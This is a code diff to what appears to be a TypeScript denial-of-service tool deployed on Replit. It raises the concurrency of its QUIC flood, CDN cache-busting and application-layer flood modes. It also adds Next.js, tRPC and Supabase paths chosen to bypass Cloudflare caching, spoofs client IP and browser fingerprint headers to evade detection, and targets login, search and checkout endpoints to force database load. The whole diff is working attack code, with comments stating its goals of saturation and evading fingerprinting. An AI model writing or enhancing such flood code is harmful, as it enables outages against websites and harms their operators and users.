@@ -21,13 +21,13 @@ const CPU_CORES   = os.cpus().length;
 const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);
 
 // Dynamic burst — scales with available RAM
-// Deployed (32GB): floor 200, ceil 2500 — maximizes saturation
+// Deployed (32GB): floor 200, ceil 4000 — 60% increase over previous 2500
 // Dev (2GB):       always 8 — avoids container kill
 function getDynamicBurst(base = 800): number {
   const freeMB = os.freemem() / 1_048_576;
   const scale  = Math.min(1.0, freeMB / 512);          // 512MB = full scale
   if (!IS_PROD) return 8;
-  const ceil = IS_DEPLOYED ? 2500 : 800;
+  const ceil = IS_DEPLOYED ? 4000 : 800;
   return Math.max(200, Math.min(ceil, Math.floor(base * scale)));
 }
 
@@ -141,6 +141,17 @@ const HOT_PATHS = [
   "/wp-json/wc/v3/products", "/wp-json/wc/v3/orders", "/admin/api/",
   "/cdn-cgi/challenge-platform/", "/.well-known/security.txt",
   "/api/v1/analytics", "/api/events", "/api/realtime",
+  // Next.js 14/15 App Router RSC routes — bypass Cloudflare CDN cache (Vary: RSC)
+  "/?_rsc=random", "/?RSC=1", "/?_rsc=prefetch", "/?_rsc=full",
+  "/_next/data/build/index.json", "/_next/data/build/page.json",
+  "/_next/image?url=%2F&w=1920&q=75", "/_next/image?url=%2F&w=3840&q=90",
+  "/_next/static/chunks/pages/index.js", "/_next/static/chunks/app/page.js",
+  "/__nextjs_original-stack-frames?frames=1", "/api/revalidate",
+  // tRPC + SvelteKit + Remix + Astro (modern frameworks)
+  "/api/trpc/user.getAll", "/api/trpc/auth.getSession", "/api/trpc/posts.list",
+  "/remix-routes", "/__data.json", "/.netlify/functions/api",
+  // Supabase / Firebase / PlanetScale edge functions
+  "/rest/v1/", "/functions/v1/", "/realtime/v1/",
 ];
 const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];
 
@@ -184,9 +195,13 @@ function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string>
     "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
     "Sec-Fetch-Dest":       "document",
     "Sec-Fetch-Mode":       "navigate",
-    "Sec-Fetch-Site":       "cross-site",
-    "Sec-CH-UA":            `"Chromium";v="125", "Not.A/Brand";v="24"`,
-    "Sec-CH-UA-Platform":   `"Windows"`,
+    "Sec-Fetch-Site":              "cross-site",
+    "Sec-CH-UA":                   `"Chromium";v="${136 - randInt(0, 3)}", "Not.A/Brand";v="8"`,
+    "Sec-CH-UA-Mobile":            "?0",
+    "Sec-CH-UA-Platform":          `"Windows"`,
+    "Sec-CH-UA-Platform-Version":  `"15.0.0"`,
+    "Sec-CH-UA-Arch":              `"x86"`,
+    "Sec-CH-UA-Bitness":           `"64"`,
   };
   if (isPost && bodyLen !== undefined) {
     h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
@@ -256,12 +271,15 @@ function buildHeavy(): string {
   }
   return parts.join("&");
 }
-// 64 entries (was 32) — larger pool = less body pattern repetition, harder to fingerprint
-for (let i = 0; i < 64; i++) HEAVY_POOL.push(buildHeavy());
+// Deployed (32GB): 128 entries — minimal body repetition across 30K+ concurrent reqs
+// Non-deployed: 64 entries
+const HEAVY_POOL_SIZE = IS_DEPLOYED ? 128 : 64;
+for (let i = 0; i < HEAVY_POOL_SIZE; i++) HEAVY_POOL.push(buildHeavy());
 setInterval(() => {
-  // Refresh 4 entries per tick (was 1) — keeps pool fresh faster under high load
-  for (let i = 0; i < 4; i++) HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
-}, 750); // was 2000ms
+  // Refresh 8 entries/tick in deployed (was 4) — keeps pool rotating faster
+  const refreshCount = IS_DEPLOYED ? 8 : 4;
+  for (let i = 0; i < refreshCount; i++) HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
+}, IS_DEPLOYED ? 500 : 750);
 const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];
 
 // ─────────────────────────────────────────────────────────────────────────
@@ -3421,8 +3439,9 @@ async function runQUICFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);   // 32GB: 64 UDP sockets
-  const INFLIGHT  = !IS_PROD ? 200 : 2000; // 32GB: 2K inflight QUIC initials per socket
+  // Deployed (32GB): 128 UDP sockets, 4K inflight; non-deployed prod: 64 sockets, 2K inflight
+  const NUM_SOCKS = !IS_PROD ? Math.min(threads, 8) : IS_DEPLOYED ? Math.min(threads, 128) : Math.min(threads, 64);
+  const INFLIGHT  = !IS_PROD ? 200 : IS_DEPLOYED ? 4000 : 2000;
   const PKTSIZE   = 1200; // QUIC minimum MTU
 
   const makeQUICInitial = (): Buffer => {
@@ -3513,7 +3532,8 @@ async function runCachePoison(
   onStats: (p: number, b: number) => void,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots
+  // Deployed (32GB): 3000 CDN-busting slots; non-deployed: 1500; dev: 80
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : IS_DEPLOYED ? Math.min(threads, 3000) : Math.min(threads, 1500);
 
   const rand    = (n: number) => Math.random() * n | 0;
   const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
@@ -3530,8 +3550,20 @@ async function runCachePoison(
     () => ({ "CF-Connecting-IP": rIP(), "True-Client-IP": rIP(), "X-Real-IP": rIP() }),
     () => ({ "Pragma": "no-cache", "Cache-Control": "no-store", "Vary": "User-Agent,Accept-Encoding,Cookie,CF-Connecting-IP,Origin" }),
     () => ({ "Origin": `https://${rHex(6)}.evil.null`, "Referer": `https://${rHex(6)}.attacker.null/ref` }),
+    // Next.js RSC cache segmentation — each unique RSC header = separate Cloudflare cache entry
+    // Cloudflare Vary: RSC → each value forks the cache key, multiplying storage demand
+    () => ({ "RSC": "1", "Next-Router-Prefetch": "1", "Next-Router-State-Tree": `%5B%22${rHex(8)}%22%5D` }),
+    () => ({ "RSC": "1", "Next-Router-Segment-Prefetch": rHex(12), "Next-Url": `/${rHex(6)}` }),
+    () => ({ "Next-Router-State-Tree": `%5B%22${rHex(16)}%22%2C%22${rHex(8)}%22%5D` }),
+    // Cloudflare workers / edge cache segmentation via device type
+    () => ({ "CF-Device-Type": ["desktop","mobile","tablet"][rand(3)], "Save-Data": rand(2) ? "on" : "off" }),
   ];
-  const PATHS = ["/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q="];
+  const PATHS = [
+    "/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q=",
+    // Next.js RSC paths — each unique _rsc value = fresh CDN key (bypasses all edge caching)
+    "/?_rsc=", "/?RSC=1&_=", "/?_rsc=prefetch&id=", "/?_rsc=full&v=",
+    "/_next/data/", "/_next/image?url=%2F&w=", "/_next/static/chunks/",
+  ];
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -4444,14 +4476,23 @@ async function runKeepaliveExhaust(
 //  APP SMART FLOOD — POST to high-cost endpoints, forces DB query per req
 // ─────────────────────────────────────────────────────────────────────────
 const SMART_ENDPOINTS = [
-  "/login", "/signin", "/auth/login",
+  // Auth — always uncacheable, forced DB query per request
+  "/login", "/signin", "/auth/login", "/auth/session", "/auth/callback",
+  "/register", "/signup", "/auth/register", "/account/login", "/user/login",
+  "/api/auth/signin", "/api/auth/session", "/api/auth/callback",
+  // Search — complex DB queries, no caching possible
   "/search", "/api/search", "/api/v1/search", "/api/v2/search",
-  "/checkout", "/cart/checkout", "/order/submit",
-  "/register", "/signup", "/auth/register",
-  "/api/users", "/api/products", "/api/orders",
-  "/api/products/search", "/api/items/search",
-  "/api/v1/auth/login", "/api/v2/checkout",
-  "/account/login", "/user/login",
+  "/api/products/search", "/api/items/search", "/api/v1/autocomplete",
+  // Checkout / e-commerce — DB read/write per request
+  "/checkout", "/cart/checkout", "/order/submit", "/cart/add", "/cart/update",
+  "/api/v2/checkout", "/api/cart", "/api/orders/create",
+  // User data — private, CDN bypassed
+  "/api/users", "/api/v1/me", "/api/v1/profile", "/api/v1/notifications",
+  "/api/products", "/api/orders", "/api/v1/feed", "/api/v1/dashboard",
+  // Next.js App Router — each request hits origin (RSC bypasses edge cache)
+  "/api/revalidate", "/_next/data/build/index.json",
+  "/api/trpc/user.getAll", "/api/trpc/auth.getSession",
+  "/api/trpc/posts.create", "/api/trpc/orders.list",
 ];
 
 async function runAppSmartFlood(
@@ -4517,7 +4558,11 @@ async function runAppSmartFlood(
       if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 25)));
     }
   };
-  await Promise.all(Array.from({ length: Math.max(50, threads) }, runSlot));
+  // Deployed: scale up to max 4000 concurrent slots (was just `threads`)
+  const numSlots = IS_DEPLOYED
+    ? Math.min(Math.max(100, threads * 4), 4000)
+    : Math.max(50, threads);
+  await Promise.all(Array.from({ length: numSlots }, runSlot));
   clearInterval(flushIv);
 }
 
